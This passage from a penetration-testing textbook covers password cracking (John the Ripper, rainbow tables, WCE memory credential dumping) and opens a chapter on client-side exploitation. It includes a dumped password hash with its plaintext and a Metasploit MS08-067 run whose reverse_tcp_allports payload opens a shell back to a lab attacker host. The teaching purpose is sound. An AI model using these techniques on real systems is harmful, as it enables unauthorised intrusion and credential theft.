of passwords . The client’s old domain administrator password was strong; it
had about 14 characters; included uppercase letters, lowercase letters, numbers,
and symbols; and was not based on a dictionary word . Fortunately, because it
was LM hashed, I was able to get the password back in a matter of minutes .
What do you think the domain administrator’s password was on the
new domain? You guessed it . It was the same as the domain administrator’s
password on the old domain . The Windows 2000 box had not been used in
over six months, but it was still running, and it used an insecure hashing algo-
rithm . Also, the client wasn’t changing their passwords regularly . These two
things combined to bring down what was otherwise a strong security posture . I
was able to access every system in the environment just by logging in with the
domain administrator password I found on the compromised Windows 2000
system .
Password Attacks 211
Cracking Linux Passwords
We can also use John the Ripper against the Linux password hashes we
dumped after exploiting the Vsftpd server backdoor in Chapter 8, as shown
in Listing 9-16.
root@kali# cat linuxpasswords.txt
georgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::
root@kali# johnlinuxpasswords.txt --wordlist=passwordfile.txt
Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])
password (georgia)
guesses: 1 time: 0:00:00:00 DONE (Sun Jan 11 05:05:31 2015) c/s: 100
trying: password - Password123
Listing 9-16: Cracking Linux hashes with John the Ripper
User georgia has an MD5 hash (we can tell from the $1$ at the beginning
of the password hash). MD5 can’t be brute-forced in a reasonable amount of
time. Instead, we use a wordlist with the --wordlist option in John the Ripper.
John the Ripper’s success at cracking the password depends on the inclu-
sion of the correct password in our wordlist.
mangling worDlists witH JoHn tHe riPPer
When required by a password policy to include a number and/or a symbol in
a password, many users will just tack them on to the end of a dictionary word .
Using John the Ripper’s rules functionality, we can catch this and other common
mutations that may slip by a simple wordlist . Open the John the Ripper configu-
ration file at /etc/john/john.conf in an editor and search for List.Rules:Wordlist .
Beneath this heading, you can add mangling rules for the wordlist . For example,
the rule $[0-9]$[0-9]$[0-9] will add three numbers to the end of each word
in the wordlist . You can enable rules in John the Ripper by using the flag
--rules at the command line . More information on writing your own rules
can be found at http://www.openwall.com/john/doc/RULES.shtml .
Cracking Configuration File Passwords
Finally, let’s try to crack the MD5 hashed passwords we found in the
FileZilla FTP server configuration file we downloaded with the Zervit 0.4
file inclusion vulnerability. As you’ll see, sometimes we don’t even need to
crack a password hash. For example, try entering the hash for the user
georgia, 5f4dcc3b5aa765d61d8327deb882cf99, into a search engine. The first
few hits confirm that georgia’s password is password. Additionally, searching
tells us that the account newuser is created when a FileZilla FTP server is
installed with the password wampp.
212 Chapter 9
Now try logging in to the Windows XP target’s FTP server with these
credentials. Sure enough, login is successful. The administrator of this
system forgot to change the default password for the built-in FTP account.
If we were not able to recover the plaintext passwords this easily, we could
again use John the Ripper with a wordlist, as discussed previously.
Rainbow Tables
Rather than taking a wordlist, hashing each entry with the relevant algo-
rithm, and comparing the resulting hash to the value to be cracked, we
can speed up this process considerably by having our wordlist prehashed.
This, of course, will take storage space—more with longer hash lists, and
approaching infinity as we try to store every possible password hash value
for brute forcing.
A set of precomputed hashes is known as a rainbow table. Rainbow tables
typically hold every possible hash entry for a given algorithm up to a certain
length with a limited character set. For example, you may have a rainbow
table for MD5 hashes that contains all entries that are all lowercase letters
and numbers with lengths between one and nine. This table is about 80 GB—
not so bad with today’s price of storage, but keep in mind this is only a very
limited amount of the possible keyspace for MD5.
Given its limited keyspace (discussed previously), an LM hash appears
to be an ideal candidate for using rainbow tables. A full set of LM hash
rainbow tables is about 32 GB.
You can download pregenerated sets of hashes from http://project
-rainbowcrack.com/table.htm. The tool Rcrack in Kali can be used to sift
through the rainbow tables for the correct plaintext.
Online Password-Cracking Services
The current hip thing to do in IT is to move things to the cloud, and pass-
word cracking is no different. By leveraging multiple high-spec machines,
you can get faster, more comprehensive results than you could with just
a virtual machine on your laptop. You can, of course, set up up your own
high-powered machines in the cloud, create your own wordlists, and so on,
but there are also online services that will take care of this for you for a
fee. For example, https://www.cloudcracker.com/ can crack NTLM Windows
hashes, SHA-512 for Linux, WPA2 handshakes for wireless, and more. You
simply upload your password hash file, and the cracker does the rest.
dumping Plaintext Passwords from memory with
windows Credential editor
Why bother cracking password hashes if we can get access to plaintext
passwords? If we have access to a Windows system, in some cases we can pull
plaintext passwords directly from memory. One tool with this functionality
is the Windows Credential Editor (WCE). We can upload this tool to an
exploited target system, and it will pull plaintext passwords from the Local
Password Attacks 213
Security Authority Subsystem Service (LSASS) process in charge of enforcing
the system’s security policy. You can download the latest version of WCE from
http://www.ampliasecurity.com/research/wcefaq.html. An example of running
WCE is shown in Listing 9-17.
C:\>wce.exe -w
wce.exe -w
WCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa
(PI:EMAIL)
Use -h for help.
georgia\BOOKXP:password
Listing 9-17: Running WCE
Here WCE found the plaintext of the user georgia’s password. The
downside to this attack is that it requires a logged-in user for the password
to be stored in memory. Even if you were able to get a plaintext password or
two with this method, it is still worth dumping and attempting to crack any
password hashes you can access.
summary
Reversing password hashes is an exciting field, and as the speed of hard-
ware increases, it becomes possible to crack stronger hashes faster. Using
multiple CPUs and even the graphics processing units (GPUs) on video
cards, password crackers can try many hashes very quickly. Our virtual
machines don’t have much processing power, but even your average modern
laptop is much faster than the machines that were used for password crack-
ing just a few short years ago. The cutting edge of password cracking these
days is taking to the cloud and harnessing multiple top-spec cloud servers
for cracking. You’ll even find some cloud-based password-cracking services.
As you’ve seen in this chapter, using information gathered from suc-
cessful exploits in Chapter 8, we’ve managed to reverse password hashes
to recover plaintext passwords for some services and the systems themselves.
Having managed to get a foothold on the systems, let’s look at some advanced
attack methods that can help us if we can’t find anything vulnerable when
listening on the network. We still have the Windows 7 machine to exploit,
after all.
214 Chapter 9
10
Client-siDe e xPloitation
The vulnerabilities we’ve studied so far have been
low-hanging fruit, and all have come up on real
engagements. It’s common on penetration tests to
find vulnerable services listening on ports, unchanged
default passwords, misconfigured web servers, and
so on.
However, clients who put a lot of time and effort into their security pos-
ture may be free from these kinds of vulnerabilities. They may have all secu-
rity patches in place; they may periodically audit passwords and remove any
that can be easily guessed or cracked. They may control user roles: Regular
users may not have administrative rights on their workstations, and any soft-
ware that is installed is investigated and maintained by the security staff. As
a result, there may not be many services to even try to attack.
Yet, despite the deployment of the latest and greatest security technolo-
gies and the employment of crack security teams, high-profile companies
(with potentially high payoffs for attackers) are still being breached. In this
chapter we’ll examine a few different kinds of attacks that don’t require
direct network access. We’ll study attacks that target local software on a
system—software that is not listening on a port.
Because we won’t attack a computer or listening port directly, and
because we need to come up with another way to attack a device inside a
corporate perimeter, we need to select our payload accordingly. Whereas
a normal bind shell might work fine for systems directly exposed to the
Internet or listening on a port on our local network, we will at the very least
be limited to reverse connections here.
But first let’s dive a little deeper into the Metasploit payload system and
check out some other payloads that may be useful to you.
Bypassing Filters with metasploit Payloads
In previous chapters we discussed the Metasploit payload system, including
single versus staged payloads and bind shells versus reverse shells. We also
talked briefly about Metasploit’s Meterpreter payload (which we’ll discuss in
depth in Chapter 13). When you use the command show payloads on a mod-
ule, you may see several payloads that may be new to you. We’ll look at a
few in this section that can be used to bypass filtering technologies you may
encounter on your pentests.
All Ports
Our network is set up such that our attack and target virtual machines are
on the same network with no firewalls or other filters blocking communica-
tions. However, in your pentesting career, you may encounter clients with
all sorts of filtering setups. Even a reverse connection may not be able to
get through the filters and connect back to your attack machine on just
any port. For example, a client network may not allow traffic to leave the
network on port 4444, the default for Metasploit reverse_tcp payloads. It may
allow traffic out only on specific ports, such as 80 or 443 for web traffic.
If we know which ports are allowed through the filter, we can set the
LPORT option to the relevant port. The Metasploit reverse_tcp_allports payloads
can help us find a port to connect to. As the name suggests, this payload
communication method will try all ports until it finds a successful connec-
tion back to Metasploit.
Let’s test this functionality with the windows/shell/reverse_tcp_allports pay-
load, as shown in Listing 10-1. We are using the MS08-067 exploit against
Windows XP.
msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp_allports
payload => windows/shell/reverse_tcp_allports
msf exploit(ms08_067_netapi) > show options
--snip--
Payload options (windows/shell/reverse_tcp_allports):
216 Chapter 10
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC thread yes Exit technique: seh, thread, process, none
LHOST 192.168.20.9 yes The listen address
uLPORT 1 yes The starting port number to connect back on
--snip--
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:1
--snip--
[*] Sending encoded stage (267 bytes) to 192.168.20.10
[*] Command shell session 5 opened (192.168.20.9:1 -> 192.168.20.10:1100) at 2015-05-14
22:13:20 -0400 v
Listing 10-1: Windows/shell/reverse_tcp_allports payload
Here, the LPORT u option specifies the first port to try. If that port doesn’t
work, the payload will try each subsequent port until the connection suc-
ceeds. If the payload reaches 65535 without success, it starts trying again at
port 1 and runs infinitely.
Because there is no filter blocking our traffic, the first port Metasploit
tries, port 1, creates a successful connection, as shown at v. Though this
payload will work in many cases, some filtering technologies will be able
to stop it regardless of the port it tries to connect to. One downside to this
payload is that it may run for a long time in an attempt to find an unfiltered
port. If a user sees the application hanging, he or she may close it before
the payload is successful.
HTTP and HTTPS Payloads
While some filters may allow all traffic out on certain ports, the most
advanced filtering systems use content inspection to screen for legitimate
protocol-specific traffic. This can pose a problem for our payloads. Even
though our Meterpreter payload communication is encrypted—the content
inspection won’t be able to say, “That’s Metasploit, go away!”—the filter will
be able to tell that the traffic going out on port 80 doesn’t meet the HTTP
specification.
To address this challenge, the developers of Metasploit created HTTP
and HTTPS payloads. These payloads follow the HTTP and HTTPS speci-
fications so that even content-inspection filters will be convinced that our
traffic is legitimate. Also, these payloads are packet based, rather than
stream based like the TCP payloads. That means they aren’t limited to a
specific connection. If you lose network communication briefly and lose all
your Metasploit sessions, HTTP and HTTPS sessions can recover and recon-
nect. (We’ll see an example using these payloads in “Java Vulnerability” on
page 230.)
Client-Side Exploitation 217
Though HTTP and HTTPS payloads will get you through most filter-
ing technologies, you may find yourself in an even more complex filtering
situation. For example, I tested one client where only the Internet Explorer
process, when started by a domain-authenticated user, could reach the
Internet. Employees could browse the Internet to perform their business,
but they were somewhat limited. For instance, they couldn’t use an instant
messenger client. While this probably annoyed some employees, it was a
good idea for security reasons. Even if we had been able to successfully
exploit something, even HTTP and HTTPS payloads could not get out to
the Internet. (In “Browser Exploitation” on page 219, we’ll look at some
attack methods that would allow us to exploit the Internet Explorer process
when a legitimate domain user is logged in and then connect to the outside
world.)
Meterpreter HTTP and Meterpreter HTTPS use the proxy settings
of Internet Explorer to navigate any proxies necessary to call out to the
Internet. For this reason, if your target process is running as the System
user, these proxy settings may not be defined, and these payloads may fail.
note There is also a Meterpreter payload, reverse_https_proxy, that allows the attacker
to manually add in any necessary proxy settings.
Client-side attacks
Now let’s turn our attention to running client-side attacks. Instead of directly
attacking a service listening on a port, we’ll create a variety of malicious
files that, when opened in vulnerable software on the target machine, will
result in a compromise.
So far all of our attacks have involved some sort of service listening on
a port, be it a web server, FTP server, SMB server, or otherwise. When we
began our pentest, one of the first things we did was port scan our targets
to see which services were listening. When we start a pentest, the potential
vulnerabilities are practically limitless.
As we begin running tools, performing manual analysis, and research-
ing, the exploitation possibilities gradually decrease until we’re left with
a limited number of issues on the target systems. Those issues have been
server-side issues—services listening on ports. What we are missing is any
potentially vulnerable software that is not listening on a port—client-side
software.
Software like web browsers, document viewers, music players, and so on
are subject to the same sort of issues as web servers, mail servers, and every
other network-based program.
218 Chapter 10
Of course, because client-side software isn’t listening on the network,
we can’t directly attack it, but the general principle is the same. If we can
send unexpected input to a program to trigger a vulnerability, we can
hijack execution, just as we exploited server-side programs in Chapter 8.
Because we can’t send input to client-side programs directly over the net-
work, we must entice a user to open a malicious file.
As security is taken more seriously and server-side vulnerabilities become
more difficult to find from an Internet-facing perspective, client-side exploita-
tion is becoming key to gaining access to even carefully protected internal
networks. Client-side attacks are ideal for assets such as workstations or
mobile devices that lack an Internet-facing IP address. Though from the
perspective of the Internet we can’t directly access those systems, they can
typically call out to the Internet, or to a pentester-controlled system, if we